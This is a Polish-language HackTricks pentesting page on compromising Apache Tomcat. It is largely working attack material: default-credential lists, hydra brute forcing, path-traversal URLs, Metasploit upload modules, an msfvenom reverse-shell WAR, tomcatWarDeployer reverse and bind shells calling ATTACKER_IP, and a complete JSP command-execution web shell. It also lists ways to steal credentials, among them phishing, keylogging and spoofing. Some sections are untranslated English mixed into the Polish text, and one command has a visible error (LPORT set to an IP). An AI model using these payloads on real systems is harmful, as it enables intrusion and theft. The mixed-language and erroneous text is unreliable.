# Tomcat

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy swoj **firm reklamowan w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajd藕 najwa偶niejsze podatnoci, aby m贸c je szybko naprawi. Intruder ledzi powierzchni ataku, wykonuje proaktywne skanowanie zagro偶e, znajduje problemy w caym stosie technologicznym, od interfejs贸w API po aplikacje internetowe i systemy chmurowe. [**Wypr贸buj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju偶 dzi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Odkrywanie

* Zazwyczaj dziaa na **porcie 8080**
* **Wsp贸lny bd Tomcat:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Wyliczanie

### **Identyfikacja wersji**
Aby znale藕 wersj Apache Tomcat, mo偶na wykona prost komend:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
To przeszuka stron indeksu dokumentacji w poszukiwaniu terminu "Tomcat", ujawniajc wersj w tagu tytuu odpowiedzi HTML.

### **Lokalizacja plik贸w Managera**
Identyfikacja dokadnych lokalizacji katalog贸w **`/manager`** i **`/host-manager`** jest kluczowa, poniewa偶 ich nazwy mog by zmienione. Zaleca si przeprowadzenie ataku brute-force w celu zlokalizowania tych stron.

### **Wyliczanie nazw u偶ytkownik贸w**
Dla wersji Tomcat starszych ni偶 6, istnieje mo偶liwo wyliczenia nazw u偶ytkownik贸w poprzez:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Domylne dane uwierzytelniajce**
Katalog **`/manager/html`** jest szczeg贸lnie wra偶liwy, poniewa偶 umo偶liwia przesyanie i wdra偶anie plik贸w WAR, co mo偶e prowadzi do wykonania kodu. Ten katalog jest chroniony przez podstawow autoryzacj HTTP, a powszechne dane uwierzytelniajce to:
- admin:admin
- tomcat:tomcat
- admin:<NIC>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Te dane uwierzytelniajce mo偶na przetestowa za pomoc:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Innym istotnym katalogiem jest **`/manager/status`**, kt贸ry wywietla wersj Tomcat i systemu operacyjnego, co uatwia identyfikacj podatnoci.

### **Atak brute force**
Aby przeprowadzi atak brute force na katalog manager, mo偶na u偶y:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Wraz z ustawianiem r贸偶nych parametr贸w w Metasploit w celu ukierunkowania na okrelony host.

## Powszechne podatnoci

### **Ujawnienie lad贸w hasa**
Dostp do `/auth.jsp` mo偶e ujawni haso w ladzie w szczliwych okolicznociach.

### **Podw贸jne kodowanie URL**
Podatno CVE-2007-1860 w `mod_jk` umo偶liwia podw贸jne kodowanie URL w celu przechodzenia cie偶ek, umo偶liwiajc nieautoryzowany dostp do interfejsu zarzdzania za pomoc specjalnie spreparowanego adresu URL.

Aby uzyska dostp do interfejsu zarzdzania Tomcatem, przejd藕 do: `pathTomcat/%252E%252E/manager/html`

### /examples
Wersje Apache Tomcat od 4.x do 7.x zawieraj przykadowe skrypty, kt贸re s podatne na ujawnienie informacji i ataki typu cross-site scripting (XSS). Te skrypty, wymienione wyczerpujco, powinny by sprawdzane pod ktem nieautoryzowanego dostpu i potencjalnego wykorzystania. Znajd藕 [wicej informacji tutaj](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Wykorzystanie podatnoci na przechodzenie cie偶ek**
W niekt贸rych [**podatnych konfiguracjach Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) mo偶na uzyska dostp do chronionych katalog贸w w Tomcat, u偶ywajc cie偶ki: `/..;/`

Na przykad, mo偶na **uzyska dostp do strony zarzdzania Tomcatem** poprzez dostp do: `www.vulnerable.com/lalala/..;/manager/html`

**Innym sposobem** na obejcie chronionych cie偶ek za pomoc tego triku jest dostp do `http://www.vulnerable.com/;param=value/manager/html`


## RCE

Wreszcie, jeli masz dostp do Tomcat Web Application Manager, mo偶esz **przesa i wdro偶y plik .war (wykona kod)**.

### Ograniczenia

Bdziesz m贸g wdro偶y plik WAR tylko jeli masz **wystarczajce uprawnienia** (role: **admin**, **manager** i **manager-script**). Szczeg贸y te mo偶na znale藕 w pliku _tomcat-users.xml_, zwykle zdefiniowanym w `/usr/share/tomcat9/etc/tomcat-users.xml` (r贸偶ni si w zale偶noci od wersji) (zobacz sekcj [POST](tomcat.md#post)).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit jest jednym z najpopularniejszych narzdzi do testowania penetracyjnego, kt贸re jest szeroko stosowane w celu identyfikacji i wykorzystania podatnoci w systemach. Jest to framework, kt贸ry umo偶liwia automatyzacj procesu testowania penetracyjnego i dostarcza szerok gam modu贸w i narzdzi, kt贸re mog by wykorzystane do atakowania r贸偶nych system贸w i aplikacji.

Metasploit oferuje wiele modu贸w, kt贸re s specjalnie zaprojektowane do atakowania usug sieciowych, takich jak Tomcat. Moduy te mog by wykorzystane do identyfikacji podatnoci, zdalnego wykonania kodu, przejcia sesji i wielu innych atak贸w.

Aby u偶y Metasploita w celu atakowania usugi Tomcat, nale偶y najpierw zidentyfikowa podatnoci wersji Tomcat, z kt贸rym si pracuje. Nastpnie mo偶na u偶y odpowiedniego moduu Metasploita, takiego jak `exploit/multi/http/tomcat_mgr_deploy`, aby wykorzysta znane podatnoci i zdoby dostp do systemu.

Metasploit oferuje r贸wnie偶 wiele innych modu贸w i narzdzi, kt贸re mog by wykorzystane do testowania penetracyjnego r贸偶nych usug sieciowych. Jest to niezwykle pot偶ne narzdzie, kt贸re mo偶e by u偶ywane zar贸wno przez haker贸w, jak i profesjonalist贸w ds. bezpieczestwa w celu identyfikacji i zabezpieczania podatnoci w systemach.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### Odwr贸cony shell MSFVenom

1. Utw贸rz plik war do wdro偶enia:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. Przelij plik `revshell.war` i uzyskaj do niego dostp (`/revshell/`):

### Powizane i odwr贸cone powoki z [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

W niekt贸rych scenariuszach to nie dziaa (na przykad w przypadku starszych wersji sun)

#### Pobierz
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Odwr贸cony shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. 

To establish a reverse shell, the attacker needs to set up a listener on their machine and configure the target machine to connect back to it. This can be done by exploiting vulnerabilities in network services or by tricking the target into running malicious code.

Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine. This can be useful for performing various tasks, such as exploring the file system, exfiltrating data, or escalating privileges.

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized remote administration.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Powoka powizana

Bind shell to technika, kt贸ra umo偶liwia zdalne poczenie z serwerem poprzez otwarcie portu i nasuchiwanie na nim. Gdy atakujcy nawi偶e poczenie, uzyskuje pen kontrol nad systemem. Jest to przydatne narzdzie podczas test贸w penetracyjnych, kt贸re umo偶liwia zdalne wykonywanie polece na zdalnym serwerze.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### U偶ywanie [Culsterd](https://github.com/hatRiot/clusterd)

Culsterd is a tool that can be used to exploit vulnerabilities in Apache Tomcat. It provides various modules that can be used to perform different types of attacks.

#### Installation

To install Culsterd, you can clone the repository from GitHub:

```
git clone https://github.com/hatRiot/clusterd.git
```

#### Usage

Once Culsterd is installed, you can use it to exploit vulnerabilities in Apache Tomcat. The tool provides several modules that can be used for different purposes:

- **ajp_fuzz**: This module can be used to fuzz the AJP protocol and discover potential vulnerabilities.
- **ajp_lfi**: This module can be used to exploit a Local File Inclusion (LFI) vulnerability in Apache Tomcat.
- **ajp_rce**: This module can be used to exploit a Remote Code Execution (RCE) vulnerability in Apache Tomcat.
- **ajp_shell**: This module can be used to gain a shell on the target system through the AJP protocol.
- **ajp_upload**: This module can be used to upload files to the target system through the AJP protocol.
- **ajp_webshell**: This module can be used to deploy a web shell on the target system through the AJP protocol.

To use a specific module, you can run the following command:

```
./clusterd.py <module> <options>
```

Replace `<module>` with the name of the module you want to use and `<options>` with the required options for that module.

#### Example

Here is an example of how to use the `ajp_rce` module to exploit a Remote Code Execution vulnerability in Apache Tomcat:

```
./clusterd.py ajp_rce --target <target_ip> --port <target_port> --command "<command>"
```

Replace `<target_ip>` with the IP address of the target system, `<target_port>` with the port number of the target system, and `<command>` with the command you want to execute on the target system.

#### Conclusion

Culsterd is a powerful tool that can be used to exploit vulnerabilities in Apache Tomcat. By using its various modules, you can perform different types of attacks and gain unauthorized access to the target system. However, it is important to use this tool responsibly and only on systems that you have permission to test.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Metoda manualna - Web shell

Utw贸rz plik **index.jsp** o [takiej zawartoci](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Mo偶esz r贸wnie偶 zainstalowa to (umo偶liwia przesyanie, pobieranie i wykonywanie polece): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Metoda rczna 2

Pobierz JSP web shell, tak jak [ta](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) i utw贸rz plik WAR:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Nazwa pliku z danymi uwierzytelniajcymi Tomcat to _tomcat-users.xml_.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Inne sposoby na zdobycie powiadcze Tomcat:

1. **Phishing**: Wykorzystaj technik phishingu, aby oszuka u偶ytkownik贸w i zdoby ich dane logowania do Tomcat.

2. **Brute-forcing**: Pr贸buj r贸偶nych kombinacji nazw u偶ytkownik贸w i hase, aby znale藕 poprawne powiadczenia.

3. **Sabe hasa**: Sprawd藕, czy u偶ytkownicy u偶ywaj sabych hase, takich jak "admin" lub "password".

4. **Podgldanie**: Przechwy dane logowania, gdy u偶ytkownicy wprowadzaj je na stronie logowania Tomcat.

5. **Ataki sownikowe**: Wykorzystaj list popularnych hase lub sownik贸w, aby przeprowadzi atak sownikowy na stronie logowania Tomcat.

6. **Zamanie hase**: Wykorzystaj techniki zamania hase, takie jak ataki brute-force, ataki sownikowe lub ataki z wykorzystaniem tablic tczowych, aby odzyska hasa u偶ytkownik贸w.

7. **Podatnoci aplikacji**: Wykorzystaj podatnoci w aplikacji Tomcat, kt贸re mog umo偶liwi zdobycie powiadcze.

8. **Przechwytywanie pakiet贸w**: Przechwy pakiety sieciowe, aby znale藕 dane logowania przesyane przez u偶ytkownik贸w.

9. **Keylogging**: Zainstaluj keylogger na komputerze u偶ytkownika, aby rejestrowa wszystkie wprowadzane przez niego dane, w tym dane logowania do Tomcat.

10. **Spoofing**: Wykorzystaj technik spoofingu, aby podszy si pod prawidow stron logowania Tomcat i przechwyci dane logowania u偶ytkownik贸w.
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Inne narzdzia do skanowania Tomcat

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Odwoania
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajd藕 najwa偶niejsze podatnoci, aby szybko je naprawi. Intruder ledzi powierzchni ataku, wykonuje proaktywne skanowanie zagro偶e, znajduje problemy w caym stosie technologicznym, od interfejs贸w API po aplikacje internetowe i systemy chmurowe. [**Wypr贸buj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju偶 dzi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy **reklam swojej firmy w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
